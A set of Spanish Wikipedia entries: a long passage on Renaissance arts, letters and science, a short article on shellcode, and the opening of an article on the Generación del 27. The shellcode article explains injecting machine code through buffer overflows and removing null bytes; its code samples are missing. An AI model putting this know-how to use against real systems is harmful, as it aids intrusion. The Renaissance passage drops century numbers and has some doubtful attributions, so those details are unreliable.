Fouquet, gran pintor del aún en la órbita del gótico.

El Renacimiento artístico no fue en Alemania una tentativa de resurrección del arte clásico, sino una renovación intensa del espíritu germánico, motivado por la Reforma protestante. Alberto Durero fue la figura dominante del Renacimiento alemán. Su obra universal, que ya en vida fue reconocida y admirada en toda Europa, impuso la impronta del artista moderno, uniendo la reflexión teórica con la transición decisiva entre la práctica medieval y el idealismo renacentista. Sus pinturas, dibujos, grabados y escritos teóricos sobre arte ejercieron una profunda influencia en los artistas del de su propio país y de los Países Bajos. Durero comprendió la imperiosidad de adquirir un conocimiento racional de la producción artística, e introdujo el idealismo de raigambre italiana en el arte alemán.

La pintura germánica conoció en esta época uno de sus mayores momentos de esplendor. Junto a la figura fundamental de Durero surgieron otros grandes autores, como Lucas Cranach el Viejo, pintor por antonomasia de la Reforma protestante; Hans Baldung Grien, introductor de temáticas siniestras y novedosas, deudoras en cierto modo del arte medieval; Matthias Grünewald, uno de los precursores del expresionismo; Albrecht Altdorfer, excelente paisajista; o Hans Holbein el Joven, que desarrolló casi toda su producción, centrada en el retrato, en Inglaterra.

En escultura pervivieron las formas góticas hasta bien entrado el . Destaca la obra de Peter Vischer, autor de las tumbas imperiales de Innsbruck (1513) y de la tumba de San Sebaldo en Núremberg (1520). También trabajaron aquí algunos artistas flamencos, como Hubert Gerhard, autor del "San Miguel" de la fachada de la iglesia de San Miguel de Múnich.

En arquitectura, los primeros exponentes de relevancia fueron los edificios patrocinados por la familia Fugger en Augsburgo, como la Capilla Fugger en la iglesia de Santa Ana (1509-1518) o el barrio de casas obreras llamado Fuggerei (1519-1523). Tras la Reforma, el mecenazgo de la nobleza alemana se centró en primer lugar en la arquitectura, por la capacidad de esta para mostrar el poder y prestigio de los gobernantes. Así, a mediados del se amplió el castillo de Heidelberg, siguiendo las directrices clásicas. Sin embargo, la mayoría de los príncipes alemanes prefirieron conservar las obras góticas, limitándose a decorarlas con ornamentación renacentista.

A la par que se desarrollaba en Italia el Cinquecento la escuela flamenca de pintura alcanzó un desarrollo notable, como heredera y continuadora de la tradición tardogótica anterior representada por Jan van Eyck, Rogier van der Weyden y otros grandes maestros. Se caracterizó por su naturalismo, rasgo que comparte con los maestros italianos, aunque se llegó más a él por la experimentación que por la teoría o los avances científicos, como en Italia. Los modos del gótico pervivieron con mayor fuerza, aunque matizados con características singulares, como cierta vena caricaturesca y fantástica y una mayor sensibilidad a la realidad del pueblo llano y sus costumbres. Se recoge ese interés en obras de carácter menos idealizado que las italianas, con una marcada tendencia por el detallismo casi microscópico que aplican a las representaciones —influjo de los maestros tardogóticos ya mencionados y la miniatura—, y tendencia hacia lo decorativo, sin demasiado interés por disquisiciones teóricas. Por otro lado, la gran aportación del arte flamenco en esta época fue la técnica de la pintura al óleo.

A mediados del el clasicismo italiano entra con fuerza en la pintura flamenca, manifestándose en la llamada Escuela de Amberes y en pintores como Jan van Scorel o Mabuse, algunos de los cuales permanecieron en Italia estudiando a los grandes maestros. A la difusión de los nuevos modelos contribuyó sobremanera el grabado, que puso al alcance de prácticamente cualquier artista las obras producidas en otras escuelas y lugares, poniendo muy de moda en toda Europa el estilo italianizante. Algunos grandes nombres de la época fueron Joachim Patinir, uno de los creadores del paisaje como género autónomo de la pintura, aunque apegado todavía al gótico; Quentin Metsys, que se inspiró en los dibujos caricaturescos de Leonardo y en las clases populares para retratar vicios y costumbres; el retratista Antonio Moro; el Bosco, uno de los pintores más originales de la historia, apegado formalmente a la tradición de la vieja escuela flamenca, pero a la vez innovador, creador de un universo fantástico, casi onírico que lo sitúan como uno de los precedentes del surrealismo ("El jardín de las delicias", 1500-1505); y Pieter Brueghel el Viejo, uno de los grandes maestros del paisaje y las costumbres populares, quizá el más moderno de todos ellos, aun cuando en su pintura glose sentencias morales y de crítica social que tienen algo de medieval ("El triunfo de la Muerte", 1563).

En el campo de la escultura destacó Adriaen de Vries, autor de expresivas obras —generalmente de bronce— en las que el movimiento, la línea ondulada o "serpentinata" y el desnudo heroico las caracterizan como excelentes ejemplos de manierismo escultórico fuera de Italia.

En arquitectura el gótico siguió teniendo una gran preponderancia hasta bien entrado el , en que se recibió la influencia de la arquitectura renacentista francesa, como se denota en el Ayuntamiento de Amberes (1561-1565), obra de Cornelis Floris de Vriendt.








Las primeras muestras de arquitectura colonial en América tuvieron, al igual que en la metrópoli, cierta pervivencia de rasgos góticos, si bien pronto empezaron a llegar las nuevas corrientes que se producían en España, como el purismo y el plateresco (Catedral de Santo Domingo). Al iniciarse la colonización, la arquitectura que se desarrolló principalmente fue de signo religioso: por orden real, el primer edificio que se debía construir en cualquier nueva ciudad debía ser una iglesia. Durante la primera mitad del fueron las órdenes religiosas las encargadas de la edificación de numerosas iglesias en México, preferentemente un tipo de iglesias fortificadas, en un conjunto almenado con iglesia, convento, un atrio y una capilla abierta —llamadas «capillas de indios»—, como el Convento de Tepeaca, el de Huejotzingo y el de San Gabriel en Cholula. A mediados de siglo se empezaron a construir las primeras grandes catedrales, como las de México, Puebla y Guadalajara. Se sigue por lo general la planta rectangular con testero plano, tomando como modelos la Catedral de Sevilla, la de Jaén y la de Valladolid. En Perú, en 1582 se inició la Catedral del Cuzco y, en 1592, la de Lima, ambas obras del extremeño Francisco Becerra. En Argentina destaca la Catedral de Córdoba, obra del jesuita Andrés Blanqui.

Las primeras muestras de pintura colonial fueron las de escenas religiosas elaboradas por maestros anónimos, realizadas con medios precolombinos, con tintas vegetales y minerales y telas de trama áspera e irregular. Destacaron las imágenes de la "Virgen con el Niño", con una iconografía de raíces autóctonas donde, por ejemplo, se representaban los arcángeles como arcabuceros contemporáneos. La producción artística hecha en Nueva España por indígenas en el es denominada arte indocristiano. Adentrado el surgieron los grandes frescos murales, de carácter popular. Desde mediados de siglo empezaron a llegar, procedentes de Sevilla, maestros españoles (Alonso Vázquez, Alonso López de Herrera), flamencos (Simon Pereyns) e italianos (Mateo Pérez de Alesio, Angelino Medoro).

En escultura, las primeras muestras fueron nuevamente en el terreno religioso, en tallas exentas y retablos para iglesias, confeccionadas generalmente en madera recubierta con yeso y decorada con encarnación —aplique directo del color— o estofado —sobre un fondo de plata y oro—. A principios del nacieron las primeras escuelas locales, como la quiteña, la cuzqueña y la chilota, destacando la labor patrocinadora de la orden jesuita.

Las artes industriales tuvieron un gran auge debido al gusto por el lujo de las nuevas clases adineradas: se desarrolló la ebanistería, sobre todo en Italia y Alemania, destacando la técnica de la intarsia, embutidos de madera de varios tonos para producir efectos lineales o de ciertas imágenes. La tapicería destacó en Flandes, con obras basadas en bocetos desarrollados por pintores como Bernard van Orley. La cerámica se elaboró en Italia con barnices vidriados, consiguiendo tonos brillantes de gran efecto. El vidrio se desarrolló notablemente en Venecia (Murano), decorado a veces con hilos de oro o con filamentos de vidrios de colores. La orfebrería fue cultivada por escultores como Lorenzo Ghiberti o Benvenuto Cellini, con piezas de gran virtuosismo y elevada calidad, destacando especialmente los esmaltes y camafeos. 

En esta época se desarrollaron notablemente las artes gráficas, especialmente gracias a la invención de la imprenta, apareciendo o perfeccionándose la mayoría de las técnicas de grabado: calcografía (aguafuerte, aguatinta, grabado al buril, grabado a media tinta o grabado a punta seca), linograbado, xilografía, etc. En Italia se desarrolló el grabado en metal, practicado especialmente por los orfebres florentinos durante los siglos y , mientras que en el Cinquecento se perfeccionó el aguafuerte gracias a la obra del Parmigianino. En Alemania destacó la obra de Durero, especialista de la técnica del buril, aunque también realizó xilografías. En Francia, el grabado fue practicado por la escuela de Fontainebleau, en la que destacó Jean Duvet, famoso por su serie del "Apocalipsis" (1561). En Flandes surgieron notables grabadores en la ciudad de Amberes, como los hermanos Wierix, autores de estampas de excelente técnica y detallismo, aunque basadas en composiciones ajenas; o Hieronymus Cock, que reprodujo numerosas obras de Brueghel.

En el Renacimiento la jardinería cobró una especial relevancia, en paralelo al impulso otorgado a todas las artes en esta época, principalmente gracias al mecenazgo de nobles, príncipes y altos cargos de la Iglesia. El jardín renacentista se inspiró en el romano, en aspectos como la decoración escultórica o la presencia de templetes, ninfeos y estanques. Los primeros ejemplos surgieron en Florencia y Roma, regiones con una orografía accidentada y grandes desniveles de terreno, lo que originó el efectuar estudios previos de índole arquitectónica para planificar la estructura del jardín, originando la arquitectura paisajística. Un ejemplo de ello son los Jardines del Belvedere en Roma, proyectados por Bramante en 1503, el cual resolvió los desniveles con un sistema de terrazas, a las que se accede por amplias escalinatas y que están rodeadas de balaustradas, esquema que pasaría a ser típico del jardín italiano, que se convertiría en el prototipo de jardín renacentista. Se otorgó una especial importancia a la obra hidráulica, con estanques y fuentes de gran complejidad, como los de la Villa de Este en Tivoli, diseñados por Bernini. Estos diseños pasaron al resto de Europa, donde destacan por su magnificencia los jardines franceses, como los de los castillos de Amboise, Chambord y Villandry. En Francia era costumbre subdividir el jardín en diversas zonas especializadas (jardín geométrico, medicinal, silvestre), así como la construcción de canales que permitían el paseo en barca. En esta época comenzó la costumbre de recortar los setos, apareciendo los primeros jardines en forma de laberinto. También hay que resaltar la llegada de nuevas especies gracias al descubrimiento de América, lo que favoreció la apertura de jardines botánicos dedicados al estudio y catalogación de las plantas.

La teoría jardinística renacentista se nutrió especialmente de la concepción elaborada por Leon Battista Alberti de la casa y el jardín como una unidad artística basada en formas geométricas ("De Re Aedificatoria", IX, 1443-1452), así como en el modelo expuesto por Francesco Colonna en su "Hypnerotomachia Poliphili" (1499), que introducía el uso de parterres y el empleo del arte topiario para dar formas caprichosas a los árboles, o el diseño de las eras a partir de formas axiales, expuesto por Sebastiano Serlio en "Tutte l'opere d'architettura" (1537).

La literatura renacentista se desarrolló en torno al humanismo, la nueva teoría que destacaba el papel primordial del ser humano sobre cualquier otra consideración, especialmente la religiosa. En esta época el mundo de las letras recibió un gran impulso con la invención de la imprenta por Gutenberg, hecho que propició el acceso a la literatura por un público más mayoritario. Ello conllevó a una mayor preocupación por la ortografía y la lingüística, surgiendo los primeros sistemas de gramática en lenguas vernáculas (como la española de Elio Antonio de Nebrija) y apareciendo las primeras academias de lenguas nacionales. 

La nueva literatura se inspiró como el arte en la tradición clásica grecolatina, aunque también recibió una gran influencia de la filosofía neoplatónica desarrollada contemporáneamente en Italia. Por otro lado, refleja el nuevo ideal de hombre renacentista, que se ejemplifica en la figura del «cortesano» definida por Baldassare Castiglione: debía de dominar las armas y las letras por igual, y tener «buena gracia» o naturalidad sin artificio.

En Italia, cuna del nuevo estilo, perduraban aún los ecos de tres grandes autores medievales considerados a veces precursores del nuevo movimiento: Dante, Petrarca y Boccaccio. Entre los literatos surgidos en esta era conviene destacar a: Angelo Poliziano, Matteo Maria Boiardo, Ludovico Ariosto, Jacopo Sannazaro, Pietro Bembo, Baldassare Castiglione, Torquato Tasso, Nicolás Maquiavelo y Pietro Aretino. Su influencia se denotó en Francia, donde descollaron François Rabelais, Pierre de Ronsard, Michel de Montaigne y Joachim du Bellay. En Alemania, la reforma protestante impuso una mayor austeridad y una temática religiosa, cultivada por Ulrich von Hutten, Sebastian Brant y Hans Sachs. En Inglaterra, cabe citar a Tomás Moro, Edmund Spenser, Michael Drayton, Henry Constable, George Chapman, Henry Howard y Thomas Wyatt. En Portugal se halla la figura predominante de Luís de Camões.

En España comenzó una edad dorada de las letras, que se prolongaría hasta el : la poesía, influida por la italiana del "stil nuovo", contó con las figuras de Garcilaso de la Vega, fray Luis de León, San Juan de la Cruz y Santa Teresa de Jesús; en prosa surgieron los libros de caballería ("Amadís de Gaula", 1508) y se inició el género de la picaresca con el "Lazarillo de Tormes" (1554), mientras que despuntó la obra de Miguel de Cervantes, el gran genio de las letras españolas, autor del inmortal "Don Quijote" (1605).

El teatro renacentista también acusó el paso del teocentrismo al antropocentrismo, con obras más naturalistas, de aspecto histórico, intentando reflejar las cosas tal como son. Se buscaba la recuperación de la realidad, de la vida en movimiento, de la figura humana en el espacio, en las tres dimensiones, creando espacios de efectos ilusionísticos, en "trompe-l'œil". Surgió la reglamentación teatral basada en tres unidades (acción, espacio y tiempo), basándose en la "Poética" de Aristóteles, teoría introducida por Lodovico Castelvetro. En torno a 1520 surgió en el norte de Italia la "Commedia dell'arte", con textos improvisados, en dialecto, predominando la mímica e introduciendo personajes arquetípicos como Arlequín, Colombina, Pulcinella (llamado en Francia Guignol), Pierrot, Pantalone, Pagliaccio, etc. Como principales dramaturgos destacaron Niccolò Machiavelli, Pietro Aretino, Bartolomé Torres Naharro, Lope de Rueda y Fernando de Rojas, con su gran obra "La Celestina" (1499). En Inglaterra descolló el teatro isabelino, con autores como Christopher Marlowe, Ben Jonson, Thomas Kyd y, especialmente, William Shakespeare, gran genio universal de las letras ("Romeo y Julieta", 1597; "Hamlet", 1603; "Otelo", 1603; "Macbeth", 1606).

La música renacentista supuso la consagración de la polifonía, así como el afianzamiento de la música instrumental, que iría evolucionando hacia la orquesta moderna. Apareció el madrigal como género profano que aunaba texto y música, siendo la expresión paradigmática de la música renacentista. En 1498 Ottaviano Petrucci ideó un sistema de imprenta adaptado a la música, en pentagrama, con lo que se empezó a editar música. Las primeras novedades se produjeron en Flandes, donde se desarrolló la llamada polifonía «a la flamenca», cultivada por Guillaume Dufay, Johannes Ockeghem y Josquin des Prés. También cultivaron el madrigal Orlandus Lassus, Luca Marenzio, Carlo Gesualdo, Claudio Monteverdi, Cristóbal de Morales y Tomás Luis de Victoria, mientras que en polifonía religiosa destacó Giovanni Pierluigi da Palestrina. En música instrumental descolló Giovanni Gabrieli, quien experimentó con diversos timbres de instrumentos de viento y con efectos de sonido cruzado y de relieve.

En los países protestantes la música cobró gran relevancia, ya que el propio Lutero defendía la importancia de la música en la liturgia religiosa. Aquí se cultivó especialmente el coral, un género musical "a capella" o con acompañamiento instrumental, generalmente a cuatro voces mixtas. Algunos de los compositores que lo cultivaron fueron Johann Walther y Valentin Bapst.

A finales del nació la ópera, iniciativa de un círculo de eruditos (la "Camerata Fiorentina") que, al descubrir que el teatro griego antiguo era cantado, tuvieron la idea de musicalizar textos dramáticos. La primera ópera fue "Dafne" (1594), de Jacopo Peri, a la que siguió "Euridice" (1600), del mismo autor; en 1602 Giulio Caccini escribió otra "Euridice"; y, en 1607, Claudio Monteverdi compuso "La favola d'Orfeo", donde añadió una introducción musical que denominó "sinfonía", y dividió las estructuras cantadas en "arias".

La danza renacentista tuvo una gran revitalización, debida de nuevo al papel preponderante del ser humano sobre la religión, de tal manera que muchos autores consideran esta época el nacimiento de la danza moderna. Se desarrolló sobre todo en Francia –donde fue llamado "ballet-comique"–, en forma de historias bailadas, sobre textos mitológicos clásicos, siendo impulsado principalmente por la reina Catalina de Médicis. Se suele considerar que el primer ballet fue el "Ballet comique de la Reine Louise" (1581), de Balthazar de Beaujoyeulx. Las principales modalidades de la época eran la "gallarda", la "pavana" y el "tourdion". En esta época surgieron los primeros tratados sobre danza: Domenico da Piacenza escribió "De arte saltandi et choreas ducendi", siendo considerado el primer coreógrafo de la historia; Thoinot Arbeau hizo una recopilación de danzas populares francesas ("Orchesographie", 1588).

La filosofía renacentista estuvo marcada en su origen por el declive de la teología, en un mundo abocado a la modernidad que, sin renunciar aún a la religión, la circunscribe al ámbito espiritual y personal del individuo. La nueva forma de afrontar los problemas del ser humano será el racionalismo, el uso de la razón aplicada a la sociedad y a la naturaleza. Aun así, la religión siguió presente en buena medida durante esta época, aunque derivó de la teología escolástica hacia el misticismo, hacia una relación con Dios basada más en el sentimiento que no en el conocimiento, así como en la acción, la obra de acercamiento a Dios, como se percibe en la obra de Jan van Ruysbroek, Dionisio Cartujano y Tomás de Kempis.

La nueva corriente de estos tiempos será el humanismo, más interesado en el hombre y la naturaleza que en las cuestiones divinas y espirituales. El naturalismo impregna todos los ámbitos del saber, y así se habla no solo de la ciencia natural, sino también del derecho natural, la moral natural e, incluso, la religión natural, una religión que abandona todo lo sobrenatural (revelación, dogma) para ser fiel reflejo de la posición del ser humano en el mundo. El humanismo se fundamenta, como el arte, en la oposición a la cultura medieval y el retorno a la antigüedad clásica; sin embargo, buena parte de la filosofía renacentista evoluciona de la medieval en una línea continua que llega hasta Descartes, no en vano la escolástica medieval estaba fundamentada en la filosofía griega platónica y aristotélica. Aun así, numerosos humanistas despreciaron el aristotelismo escolástico por ser excesivamente teologizado, y abordaron a Platón desde la obra de sus seguidores posteriores, el llamado neoplatonismo, especialmente desde el terreno de la filosofía estoica que, como la renacentista, incidía más especialmente en el ser humano como medida de todas las cosas. Sin embargo, muchos de estos autores abordaron el tema desde una postura superficial y poco rigurosa, sin profundizar en los aspectos ontológicos y metafísicos de los clásicos griegos, sin analizar la nueva situación intelectual del ser humano alejado de Dios, cuestión que no llegará hasta el cartesianismo.

El pensamiento humanístico nació en Italia, especialmente en torno a la Academia Platónica Florentina patrocinada por Cosme de Médici, que aglutinó a pensadores como Marsilio Ficino, Giovanni Pico della Mirandola, Cristoforo Landino, Angelo Poliziano o Benedetto Varchi. Otros se encaminaron más hacia la política, como Nicolás Maquiavelo, forjador del autotitarismo monárquico como seña de identidad de las nuevas naciones-estado surgidas en esta época; o hacia el naturalismo, como Leonardo Da Vinci y Bernardino Telesio. En Francia, el humanismo tuvo un componente más escéptico, representado por Michel de Montaigne o Pierre Charron, mientras que algunas figuras se adhirieron a la reforma protestante, como Pierre de la Ramée o Henri Estienne. En Inglaterra destacó la figura de Tomás Moro, canciller de Enrique VIII, quien lo decapitó por oponerse a la reforma anglicana; fue autor de "Utopía", un esbozo de estado ideal de reminiscencias platónicas. Pero el más afamado humanista surgió en Holanda: Erasmo de Róterdam, que escribió en latín, con un estilo vivo y elegante, fiel al dogma católico, pero de mentalidad abierta y comprensiva, reflejo de un espíritu de concordia; fue autor del "Elogio de la locura" (1511).

En Alemania no recaló tanto el humanismo de carácter marcadamente literario como en otros países europeos, y la filosofía se encaminó más a la mística especulativa, heredera del Maestro Eckhart; otras figuras mezclaron esta tendencia con elementos de las ciencias naturales o aun de la alquimia y la astrología, como Agrippa von Nettesheim o Paracelso. Por otro lado, la Reforma protestante contó con figuras como Martín Lutero, Zwinglio, Philipp Melanchthon, Sebastian Franck y Jakob Böhme.

En España el pensamiento filosófico no rompió del todo con el pasado medieval, y mostró un especial interés por la lingüística, tanto clásica como vernácula (Antonio de Nebrija, Benito Arias Montano). La corriente escéptica estuvo representada por Francisco Sánchez, mientras que el humanismo antiescolástico —pero heredero de la tradición católica— contó con la figura de Juan Luis Vives, preocupado especialmente por la moral y la educación. Por otro lado, una reacción escolástica estuvo originada por la Contrarreforma tridentina que revivió el misticismo y contó con figuras como santa Teresa de Jesús y san Juan de la Cruz.

Por otro lado, además del humanismo hay otras corrientes de pensamiento que a través de diversas vías, aparentemente dispares, convergerán en la filosofía cartesiana y en los fundamentos de la filosofía moderna: una es heredera del pensamiento medieval, representada por Nicolás de Cusa o por la escolástica española; otra está más preocupada por la naturaleza y dará origen a la ciencia física moderna. Nicolás de Cusa, cardenal y obispo de Bresanona, intentó conciliar la doctrina católica con la teoría platónica, a través de una noción de Dios infinito y trascendente en el que se aglutinan la verdad y la realidad ("De docta ignorantia", 1440). La escolástica española estuvo muy ligada a la Contrarreforma, y se asoció especialmente con la orden de los jesuitas; de influencia tomista, estuvo representada por Francisco de Vitoria, Alfonso Salmerón, Luis de Molina y, especialmente, Francisco Suárez. El estudio de la naturaleza dio en el terreno filosófico la relevante figura de Giordano Bruno, autor de una doctrina panteísta por la que fue quemado por hereje, y defensor de la razón y la experiencia como única vía para conocer el mundo. También influyeron en la filosofía las nuevas teorías científicas de Nicolás Copérnico, Johannes Kepler y Galileo Galilei.

Durante el Renacimiento la ciencia cobró un gran auge, ligada a la nueva visión antropocéntrica del humanismo, y favorecida por la invención de la imprenta y por los viajes y descubrimientos geográficos ocurridos en esta era. Las ciencias naturales, fundamentadas en la metafísica nominalista, se diferenciaron de los estudios anteriores —de raíz aristotélica— en dos factores esenciales: la idea de la naturaleza y el método físico. La primera evoluciona desde la física ontológica aristotélica hacia un discurrir simbólico fundamentado en las matemáticas, pasando de analizar el «ser de las cosas» a interpretar «variaciones de fenómenos»; por tanto, se renuncia a conocer las causas a cambio de medir los fenómenos, sentando las bases de la ciencia positiva. El método físico, por otro lado, se fundamenta en el empirismo, basado en el «análisis de la naturaleza», el cual parte de una hipótesis de origen matemático para llegar a una comprobación "a posteriori" de esa premisa apriorística. Uno de los principales teóricos de la nueva ciencia fue el filósofo inglés Francis Bacon, padre del empirismo filosófico y científico; su principal obra, "Novum organum", presenta la ciencia como técnica, experimental e inductiva, capaz de dar al ser humano el dominio sobre la naturaleza.

Una de las disciplinas científicas que más se desarrolló en esta época fue la astronomía, gracias especialmente a la figura de Nicolás Copérnico: este científico polaco fue el difusor de la teoría heliocéntrica —los planetas giran alrededor del Sol— frente a la geocéntrica admitida en la Edad Media —la Tierra es el centro del universo—. Expuso esta teoría, basada en la de Aristarco de Samos, en su obra "De revolutionibus orbium coelestium" (1543). Este sistema fue posteriormente desarrollado por Johannes Kepler, quien describió el movimiento de los planetas conforme a órbitas elípticas ("Astronomia nova", 1609). Por último, Galileo Galilei sistematizó estos conocimientos y formuló los principios modernos del conocimiento científico, por lo que fue procesado por la Inquisición y obligado a retractarse; sin embargo, está considerado por ello el fundador de la física moderna. Otro astrónomo destacado de este período fue Tycho Brahe, creador del observatorio de Uraniborg, desde el que realizó numerosas observaciones astronómicas que sirvieron de base a los cálculos de Kepler. También cabe remarcar que en 1582 el papa Gregorio XIII introdujo el calendario gregoriano, que sustituyó al anterior calendario juliano.
Las matemáticas también avanzaron notablemente en esta época: Christoph Rudolff desarrolló la utilización de las fracciones decimales; Regiomontano estudió la trigonometría esférica y rectilínea en "De triangulis omnimodis" (1533); los italianos Gerolamo Cardano y Lodovico Ferrari resolvieron las ecuaciones de tercer y cuarto grado, respectivamente; otro italiano, Tartaglia, utilizó el triángulo aritmético para calcular los coeficientes de un binomio ("Tratado general de números y medidas", 1556); Rafael Bombelli estudió los números imaginarios ("Álgebra, parte mayor de la aritmètica", 1572); François Viète efectuó importantes avances en trigonometría ("Canon mathematicus", 1579), y creó el simbolismo algebraico ("Isagoge in artem analyticam", 1591); Simon Stevin estudió las primeras tablas de intereses, resolvió el problema de la composición de fuerzas y sistematizó las fracciones decimales.

En ciencias naturales y medicina también hubo importantes avances: en 1543 Andrés Vesalio publicó "De humani corporis fabrica", un compendio de anatomía con profusas ilustraciones considerado uno de los más influyentes libros científicos de todos los tiempos; Bartolomeo Eustachio descubrió las cápsulas suprarrenales; Ambroise Paré inició la cirugía moderna; Conrad von Gesner inauguró la zoología moderna con una primera clasificación de animales por géneros y familias; Miguel Servet describió la circulación pulmonar, y William Harvey la de la sangre; Gabriele Falloppio estudió la estructura interna del oído; Ulisse Aldrovandi creó el primer jardín botánico en Bolonia; Bernard Palissy fundamentó la paleogeografía; Caspar Bauhin introdujo un primer método de clasificación de las plantas; y Zacharias Janssen inventó el microscopio en 1590.

También avanzó notablemente la geografía y la cartografía, gracias a los numerosos descubrimientos realizados en esta época. Cabe destacar la labor del flamenco Gerardus Mercator, autor del primer mapa del mundo (1538) y descubridor de un método de posicionamiento geográfico sobre un mapa del rumbo dado por una aguja imantada.

En el terreno de la química, relacionada todavía con la alquimia medieval, hubo escasos avances: Georgius Agricola fundó la mineralogía moderna, clasificando los minerales según sus caracteres externos ("De Re Metallica", 1556); Paracelso aplicó la alquimia a la medicina, estudiando las propiedades de los minerales como fármacos, en el transcurso de cuyas investigaciones descubrió el cinc; Andreas Libavius escribió el primer tratado sobre química con una mínima base científica ("Alchimia", 1597), e introdujo diversos preparados químicos, como el ácido clorhídrico, el tetracloruro de estaño y el sulfato amónico, así como la preparación del agua regia.

Por último, conviene citar la figura polifacética de Leonardo da Vinci, ejemplo del hombre renacentista interesado en todas las materias tanto artísticas como científicas ("homo universalis"). En el terreno de la ciencia, realizó varios proyectos como máquinas voladoras, concentradores de energía solar o calculadoras, que no pasaron de meros proyectos teóricos. También realizó trabajos de ingeniería, hidráulica y mecánica, y estudios de anatomía, óptica, botánica, geología, paleontología y otras disciplinas.

Con el Renacimiento y su cultura más humanista e individualista, así como el despegue económico y su consecuente grado de ostentación social, y unido a los avances tecnológicos, se desarrollaron notablemente todos los aspectos relacionados con el aspecto individual y el cuidado personal, como la peluquería y la moda. La peluquería sufrió una profunda transformación y un gran auge en cuanto a establecimientos y productos dedicados al cuidado del cabello. Se puso de moda la depilación de las cejas, así como de la frente, a veces hasta medio cráneo. Aumentó el gusto por el teñido, siendo el rubio el color preferido. Por lo general, los peinados incluían un tocado, con cinco tipos principales: las tocas, las cofias o albanegas, los bonetes, los rollos y los sombreros. Desde el los peinados, especialmente los femeninos, fueron ganando en complejidad, con sofisticadas estructuras de rizos, encajes, cintas y muselinas.

En el Renacimiento surgió el concepto de moda tal como lo entendemos hoy día: se introdujeron nuevos géneros y la costura adquirió un alto grado de profesionalización. En la Italia renacentista aparecieron los trajes más ricos y espectaculares de la historia, de vivos colores y formas imaginativas y originales, que otorgaban gran relevancia a las mangas, a los pliegues y a las caídas de tela de forma vertical, con finos bordados y rica pasamanería. En el el calzón corto era a modo de bombacho, y continuó usándose el jubón medieval, junto a capas de diverso tipo y adornos como la "gorguera", una tela de encajes fruncidos que cubría el cuello. En el atuendo femenino apareció el corsé, que ceñía la cintura, sobre una falda en forma de campana llamada "crinolina", hecha de tela y crin de caballo, y reforzada con aros metálicos.

También cobró una especial relevancia la gastronomía, que llegó a altas cotas de refinamiento y sofisticación. Destacó la cocina veneciana, que gracias a su comercio con Oriente favoreció la importación de todo tipo de especias: pimienta, mostaza, azafrán, nuez moscada, clavo, canela, etc. Un factor determinante para una nueva gastronomía fue el descubrimiento de América, de donde llegaron nuevos alimentos como el maíz, la patata, el tomate, el cacao, los frijoles, el cacahuete, el pimiento, la vainilla, la piña, el aguacate, el mango o el tabaco.




</doc>
<doc id="6441" url="https://es.wikipedia.org/wiki?curid=6441" title="Shellcode">
Shellcode

Una shellcode es un conjunto de órdenes programadas generalmente en lenguaje ensamblador y trasladadas a opcodes (conjunto de valores hexadecimales) que suelen ser inyectadas en la pila (o stack) de ejecución de un programa para conseguir que la máquina en la que reside se ejecute la operación que se haya programado.

El término shellcode deriva de su propósito general, esto era una porción de un exploit utilizada para obtener una shell. Este es actualmente el propósito más común con que se utilizan.

Para ejecutar una shellcode generalmente suele utilizarse un lenguaje de más alto nivel, como es el caso del lenguaje Pascal.
Los opcodes obtenidos de nuestro código ensamblador son enlistados en una matriz de tipo byte y cargado en un prototipo para ser invocado.

Un ejemplo de un shellcode es el siguiente:
Como se puede apreciar, los opcodes son valores hexadecimales que son convertidos a bytes (valores enteros entre 0 a 255) y que el sistema operativo comprende como código ensamblador que ejecuta.

En el siguiente ejemplo se muestra una shellcode contenida en un array de un programa escrito en lenguaje C:

Así tenemos que una shellcode es código máquina escrito en notación hexadecimal. Posteriormente se utilizan dentro de programas escritos en C, como en el siguiente shellcode de ejemplo:

O este otro:

Las shellcodes deben ser cortas para poder ser inyectadas dentro de la pila, que generalmente suele ser un espacio reducido.

Las shellcodes se utilizan para ejecutar código aprovechando ciertas vulnerabilidades en el código llamadas desbordamiento de búfer. Principalmente el shellcode se programa para permitir ejecutar un intérprete de comandos en el equipo afectado. 

Es común que en la compilación de una shellcode se produzcan bytes nulos, los cuales deben ser eliminados de la misma, ya que frenarían la ejecución de la shellcode. Para ello el programador se vale de diversas técnicas, como remplazar las instrucciones que genera bytes NULL por otras que no lo hagan o realizar una operación XOR, mover hacia registros más pequeños (como AH, AL), y de esta forma permitir que la shellcode sea realmente inyectable.



</doc>
<doc id="6443" url="https://es.wikipedia.org/wiki?curid=6443" title="Generación del 27">
Generación del 27

Con el término Generación del 27 se denomina comúnmente a una constelación de escritores varones españoles (las artistas mujeres de esta generación se conocen como Las Sinsombrero), en su mayor parte poetas, del siglo XX que se dio a conocer en el panorama cultural alrededor del año 1927, con motivo del homenaje a Luis de Góngora organizado en ese año por José María Romero Martínez en el Ateneo de Sevilla con motivo del tercer centenario de su muerte, en el que participaron muchos de sus miembros más conocidos, dentro de la llamada "Edad de Plata" de la literatura española, época en que coincidieron en plena producción durante la Segunda República esta brillante promoción junto a otras dos no menos brillantes: Generación del 98 y Novecentismo.

Hay, por parte de los expertos, cierta polémica sobre si debe considerar o no como "generación" a este grupo de autores, puesto que según uno de sus miembros, Pedro Salinas, los integrantes del mismo no cumplen los criterios que Julius Petersen asigna al concepto historiográfico de "Generación":


Realmente parece difícil ver un patrón tan claro en el heterogéneo grupo de autores que podrían encuadrarse en la denominada "Generación del 27". Si bien es cierto que el nacimiento de la mayoría se sitúa en un lapso que no rebasa los 15 años, no todos los autores nacidos entonces se han considerado miembros del grupo. La mayoría posee una sólida formación universitaria; pero no hubo un guía claro, aunque al principio se dejaran ayudar por Juan Ramón Jiménez, ni tampoco un "lenguaje generacional", ya que, si bien todos ejercieron estéticas de la Vanguardia artística, no renunciaron a la tradición literaria culta del Siglo de Oro o la popular (neopopularismo); además atravesaron por distintas etapas, por más que una bastante común y muy definitoria fuese la surrealista.

Aunque se podría considerar "acontecimiento generacional" el acto de reivindicación en el Ateneo de Sevilla de la segunda época de Luis de Góngora, la llamada culterana, comúnmente rechazada por la crítica literaria oficial, no se levantaron con firmeza contra generaciones anteriores, ni estas se hallaban en un estado de anquilosamiento; muy por el contrario constituyen una generación "cumulativa" que asume los logros de las anteriores, y todas estas generaciones del 98, del 14 y del 27, las que forman la llamada Edad de Plata de la literatura española, reaccionaban en el fondo contra una sola: la decimonónica, identificada con la falsía del turnismo de partidos y de la Restauración monárquica, contra las que se levantó también el Krausismo, la Institución Libre de Enseñanza y el Regeneracionismo, 
